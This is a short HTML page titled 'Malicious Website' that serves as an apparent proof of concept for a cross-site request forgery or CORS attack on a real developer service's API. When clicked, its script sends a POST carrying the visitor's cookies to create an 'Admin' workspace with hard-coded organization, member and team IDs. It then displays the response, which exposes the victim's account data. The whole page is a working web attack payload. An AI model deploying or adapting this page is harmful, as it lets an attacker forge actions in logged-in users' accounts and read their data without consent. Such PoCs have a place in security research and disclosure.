<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Malicious Website</title>
</head>
<body>
    <h1>Malicious Website</h1>
    <button id="sendRequest">Send Request to Your Website</button>

    <h2>Response Data from Your Website:</h2>
    <pre id="responseData"></pre>  <!-- Where we show the data -->

    <script>
        document.getElementById('sendRequest').addEventListener('click', function() {
            // Send a POST request to your website's API endpoint
            fetch('https://gitkraken.dev/api/organizations/68d29998bced52677d0f6e64/workspaces', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    azureOrganizationId: "",
                    name: "Admin",
                    description: "SORSORAR KING",
                    members: [
                        {"id": "27be5549-c311-41de-8702-eb1ba1261e72"},
                        {"id": "c17a1ae9-985b-405b-92b6-9d635fc92d35"}
                    ],
                    teams: ["68daa3868bea5b78f08d4e92"],
                    repositories: [],
                    provider: "GITHUB",
                    hostUrl: ""
                }),
                credentials: 'include'  // Sends cookies if needed
            })
            .then(response => response.json())  // Parse JSON response from the server
            .then(data => {
                // If data is received, display it on the page
                console.log('Response from your website:', data);  // Log the response
                document.getElementById('responseData').textContent = JSON.stringify(data, null, 2);  // Show it on the page
            })
            .catch(error => {
                console.error('Error:', error);  // If an error occurs, log it
            });
        });
    </script>
</body>
</html>
